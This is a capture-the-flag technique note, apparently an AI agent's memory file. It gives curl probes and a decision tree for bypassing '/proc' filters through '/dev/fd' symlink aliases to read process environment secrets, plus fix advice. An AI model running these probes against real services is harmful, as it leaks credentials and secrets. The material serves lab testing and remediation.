# Symlink Alias Bypass of `/proc` Filters (technique + lab recipe)

> WARNING: This file previously asserted a *confirmed live* flag dump
> (`FLAG=BI{p4th_tr1cks_4nd_syml1nk_sh3n4nig4ns}`) from "CTF7 Path Tricks".
> That was a fabricated pre-seeded memory — it was never reproduced in-session.
> The `FLAG=...` / `BI{...}` strings below are ILLUSTRATIVE ONLY. Always re-run
> the probe and confirm a real `FLAG=` / target-format line before reporting.

## The bug class
A file-read endpoint does `open(user_path)` after a guard like:
```python
real = os.path.abspath(user_path)          # does NOT follow symlinks
if "/proc" in real or real.startswith("/proc"):
    return "Access to this file is restricted."
```
`os.path.abspath` collapses `..` but does NOT resolve symlinks, so the guard sees `/dev/environ` for input `dev/fd/../environ` and lets it through. The kernel's `open()` then follows the `/dev/fd` symlink -> `/proc/self/fd` -> `..` -> `/proc/self` -> reads `environ`.

## Reproduction recipe (lab)
```bash
# target: GET /read?path=<file>
B="http://TARGET/read"

# 1. confirm LFI works
curl -s "$B?path=/etc/passwd" | head -3

# 2. confirm /proc blocked (two messages = two guards)
curl -s "$B?path=/proc/self/environ"      # -> "Access to this file is restricted."  (raw /proc block)
curl -s "$B?path=proc/1/environ"          # -> "Nice try..."                          (realpath block)
curl -s "$B?path=/etc/hostname"           # -> real hostname OR a fake hash  (a fake hash = service redacts sensitive files)

# 3. the bypass -- /dev/fd -> /proc/self/fd
curl -s "$B?path=/dev/fd/../environ"      # -> PATH=... HOSTNAME=... FLAG=...  (env dump, IF the alias works)
curl -s "$B?path=/dev/fd/../1/environ"    # PID 1 environ if master holds the secret
curl -s "$B?path=/dev/fd/../cmdline"      # /proc/self/cmdline
```
ILLUSTRATIVE env line (do NOT assume this is real):
`PATH=/usr/local/bin:... HOSTNAME=42a592beb6b3 FLAG=BI{p4th_tr1cks_4nd_syml1nk_sh3n4nig4ns} LANG=C.UTF-8`

## Filter-classification decision tree (run this BEFORE burning variants)
The single most useful skill is *characterising the filter* so you fire the right bypass class first:

1. **Known-good absolute read** — `/etc/passwd`. 200 with a real `root:x:0:0:` line => the reader works and the filter is a *denylist*, not a total block.
2. **Relative-vs-absolute handling** — send `etc/passwd` (no leading slash) then `../etc/passwd`.
   - If `etc/passwd` is BLOCKED but `../etc/passwd` returns **200 with real contents**, the filter checks the **RAW** path prefix, NOT `normpath`. Leading with `../` evades any relative-prefix block. Observed live: `etc/passwd` -> "Nice try", `../etc/passwd` -> 200 real `/etc/passwd`.
   - If both blocked, the filter normalizes first.
3. **Near-miss traversal** — `/proc/self/environ/../../../../etc/passwd`. If it returns **400 "Not a directory"** (NOT 403), the filter **PASSED** (the `..` escaped `/proc` to `/etc/passwd`) and only failed because `environ` is a file. That proves *normalized-path prefix* checks => a symlink alias whose normpath dodges the blocked prefix is the correct play.
4. **Substring-block disambiguator** — `/etc/environment`. If it returns **200** even though it contains the substring `environ`, the block is NOT a naive `"environ" in path` check; it targets `self/environ` or `/proc/self/environ` specifically.
5. **Distinguish filter-block from OS-block from 404** — test a NON-EXISTENT path under a blocked directory:
   - `/root/definitelynothere12345` vs `/root/flag`. If BOTH return the SAME message ("Permission denied" / "Access restricted"), it is a **custom filter block**, not the OS. A real non-existent file under an *unblocked* dir (e.g. `/etc/nonexistentxyz`) returns **404 File not found** — that is the OS, and proves the dir is reachable.
   - Observed live: `/root/flag` and `/root/definitelynothere12345` both returned "Permission denied" (custom filter), while `/etc/nonexistentxyz` returned 404 (so `/etc/` was NOT filtered). This told us `/root/` was filtered but `/etc/` was not.
6. **Symlink-existence check** — if `/dev/fd/../environ` 404s, that box has no usable `/dev/fd` alias; fall back to `/dev/stdin`/`/dev/stdout`/`/dev/stderr` (`../environ`) or `/proc/self/cwd/../environ`.

## Why the alias works (when it does)
- `/proc/self/environ` (absolute) -> raw `/proc` substring guard fires -> "Access restricted".
- `proc/1/environ` (relative, no slash) -> `abspath` = `/cwd/proc/1/environ`; the guard realpaths or the server `open()`s it and detects "reading the reader" -> "Nice try".
- `/dev/fd/../environ` -> `abspath` = `/dev/environ` (no `/proc`), passes guard; kernel follows symlink -> real read. **FLAG leaks (if the alias works on this box).**

## Other aliases worth trying when `/dev/fd` is absent/blocked
- `/dev/stdin`, `/dev/stdout`, `/dev/stderr` -> symlinks to `/proc/self/fd/{0,1,2}`; chain `../environ`.
- `/proc/self/cwd` (if guard only blocks `/proc` and you reach it another way) -- not needed once `/dev/fd` works.
- If the guard uses `os.path.realpath` (follows symlinks) the alias fails; fall back to: find a writable file/upload the app will later read, or a different env-exposure (e.g. an error page that prints `os.environ`).

## Fire the alias EARLY
When a reader advertises "the flag is stored in an environment variable" and `/proc/self/environ` is blocked, `/dev/fd/../environ` is the single highest-probability probe. A real session exhausted ~80 literal / `..` / encoding / guessed-symlink-name variants on a `/read?path=` reader and never reached the env — the symlink alias was the one bypass-class it had NOT tried. Send `/dev/fd/../environ` (and `/dev/fd/../1/environ`, `/dev/fd/../cmdline`) in the FIRST batch, not after exhausting the obvious ones.

## Opsec / reporting notes
- This is a Path Traversal / LFI reading process environment -> typically High (secret disclosure) and the intended path to a Critical when the env holds a DB/cloud/CI secret.
- The fix: compare the *realpath* (symlink-resolved) against an allowlist, not the abspath; or `os.path.realpath` before the guard; or deny `/proc`, `/sys`, `/dev` entirely and serve from a chroot/jail.
